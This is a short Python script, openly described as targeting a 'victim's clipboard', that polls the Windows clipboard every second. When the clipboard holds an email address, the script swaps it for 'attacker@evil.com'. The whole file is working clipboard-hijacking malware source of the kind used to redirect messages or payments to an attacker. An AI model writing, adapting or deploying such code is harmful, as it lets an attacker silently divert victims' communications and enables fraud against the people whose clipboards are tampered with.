# This script looks for email addressess in victim's clipboard

import win32clipboard,re
from time import sleep

attacker_email = "attacker@evil.com"
emailregex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

while True:
    win32clipboard.OpenClipboard()              # accesssing clipboard data
    data = win32clipboard.GetClipboardData().rstrip()
    print(data)
    if (re.search(emailregex,data)):            # looking for strings matching email regex
        win32clipboard.EmptyClipboard();        # empty clipboard
        win32clipboard.SetClipboardText(attacker_email)             # paste out attacker email so we get the email      
        break
    win32clipboard.CloseClipboard()
    sleep(1)